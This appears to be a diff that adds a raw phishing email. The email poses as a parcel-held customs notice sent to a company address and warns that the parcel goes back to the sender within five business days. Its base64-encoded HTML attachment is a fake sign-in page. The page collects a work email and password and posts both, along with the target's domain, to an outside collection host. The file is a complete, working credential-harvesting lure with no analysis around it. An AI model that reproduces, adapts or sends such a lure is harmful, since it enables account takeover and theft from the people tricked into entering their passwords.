@@ -1,0 +1,75 @@
+Return-Path: <notices@parcel-trace-intl.example>
+Received: from mx-in-02.arborridge.example (localhost [127.0.0.1])
+	by mx-in-02.arborridge.example (Postfix) with ESMTP id 9C4F7D2261
+	for <h.castellanos@arborridge.example>; Wed, 19 Aug 2026 11:27:09 -0500 (CDT)
+Received: from vps-4411.cheaphost-eu.example (vps-4411.cheaphost-eu.example [192.0.2.88])
+	by mx-in-02.arborridge.example (Postfix) with ESMTP id 8B3E6D2254
+	for <h.castellanos@arborridge.example>; Wed, 19 Aug 2026 11:27:05 -0500 (CDT)
+Authentication-Results: mx-in-02.arborridge.example;
+	spf=softfail (sender IP is 192.0.2.88) smtp.mailfrom=parcel-trace-intl.example;
+	dkim=none (message not signed);
+	dmarc=none (p=none) header.from=parcel-trace-intl.example
+From: "Shipping Notifications" <notices@parcel-trace-intl.example>
+To: <h.castellanos@arborridge.example>
+Subject: Delivery exception - parcel 7730184412 held at facility
+Date: Wed, 19 Aug 2026 11:27:02 -0500
+Message-ID: <7730184412.notice@vps-4411.cheaphost-eu.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_8841_17299"
+
+This is a multi-part message in MIME format.
+
+------=_Part_8841_17299
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Parcel Trace International - automated delivery notice
+
+Parcel reference: 7730184412
+Status: HELD - customs documentation incomplete
+Facility: Sorting Centre 04
+
+A parcel addressed to your organisation is being held pending
+documentation. The attached notice contains the exception details and
+the release authorisation step.
+
+Parcels not released within 5 business days are returned to sender at
+the shipper's cost.
+
+Open the attached notice to proceed.
+
+-- 
+Parcel Trace International
+Automated notification - do not reply
+
+------=_Part_8841_17299
+Content-Type: text/html; charset="utf-8"; name="Delivery_Notice_7730184412.htm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Delivery_Notice_7730184412.htm"
+
+PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgY2hhcnNldD0idXRmLTgiPgo8dGl0
+bGU+UGFyY2VsIFRyYWNlIEludGVybmF0aW9uYWwgLSBEZWxpdmVyeSBFeGNlcHRpb248L3RpdGxl
+Pgo8c3R5bGU+CmJvZHkgeyBmb250LWZhbWlseTogQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJp
+ZjsgYmFja2dyb3VuZDojZjRmNGY0OyBtYXJnaW46MDsgfQouY2FyZCB7IG1heC13aWR0aDo0MjBw
+eDsgbWFyZ2luOjQ4cHggYXV0bzsgYmFja2dyb3VuZDojZmZmOyBwYWRkaW5nOjI4cHg7IGJvcmRl
+cjoxcHggc29saWQgI2RkZDsgfQpoMiB7IGNvbG9yOiNiMDMwMTA7IGZvbnQtc2l6ZToxOHB4OyBt
+YXJnaW4tdG9wOjA7IH0KaW5wdXQgeyB3aWR0aDoxMDAlOyBwYWRkaW5nOjlweDsgbWFyZ2luOjZw
+eCAwIDE0cHggMDsgYm94LXNpemluZzpib3JkZXItYm94OyB9CmJ1dHRvbiB7IGJhY2tncm91bmQ6
+I2IwMzAxMDsgY29sb3I6I2ZmZjsgYm9yZGVyOjA7IHBhZGRpbmc6MTFweCAxOHB4OyB3aWR0aDox
+MDAlOyB9CnNtYWxsIHsgY29sb3I6Izc3NzsgfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2
+IGNsYXNzPSJjYXJkIj4KPGgyPkRlbGl2ZXJ5IGV4Y2VwdGlvbiAmbWRhc2g7IHBhcmNlbCA3NzMw
+MTg0NDEyPC9oMj4KPHA+VGhpcyBwYXJjZWwgaXMgYmVpbmcgaGVsZCBhdCBvdXIgc29ydGluZyBm
+YWNpbGl0eSBwZW5kaW5nIGN1c3RvbXMKZG9jdW1lbnRhdGlvbi4gU2lnbiBpbiB3aXRoIHlvdXIg
+d29yayBlbWFpbCB0byByZXZpZXcgdGhlIGV4Y2VwdGlvbiBub3RpY2UKYW5kIGF1dGhvcmlzZSBy
+ZWxlYXNlLjwvcD4KPGZvcm0gYWN0aW9uPSJodHRwczovL2luZ2VzdC5wYWdlaG9zdC1jZG4uZXhh
+bXBsZS9jb2xsZWN0IiBtZXRob2Q9IlBPU1QiPgo8bGFiZWw+V29yayBlbWFpbCBhZGRyZXNzPC9s
+YWJlbD4KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImVtYWlsIiB2YWx1ZT0iIj4KPGxhYmVsPkVt
+YWlsIHBhc3N3b3JkPC9sYWJlbD4KPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd2Qi
+IHZhbHVlPSIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyZWYiIHZhbHVlPSI3NzMwMTg0
+NDEyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYyIgdmFsdWU9ImFyYm9ycmlkZ2UuZXhh
+bXBsZSI+CjxidXR0b24gdHlwZT0ic3VibWl0Ij5SZXZpZXcgZXhjZXB0aW9uIG5vdGljZTwvYnV0
+dG9uPgo8L2Zvcm0+CjxwPjxzbWFsbD5QYXJjZWwgVHJhY2UgSW50ZXJuYXRpb25hbCAmbWRhc2g7
+IGF1dG9tYXRlZCBub3RpZmljYXRpb24uIERvIG5vdApyZXBseSB0byB0aGlzIG1lc3NhZ2UuPC9z
+bWFsbD48L3A+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K
+
+------=_Part_8841_17299--
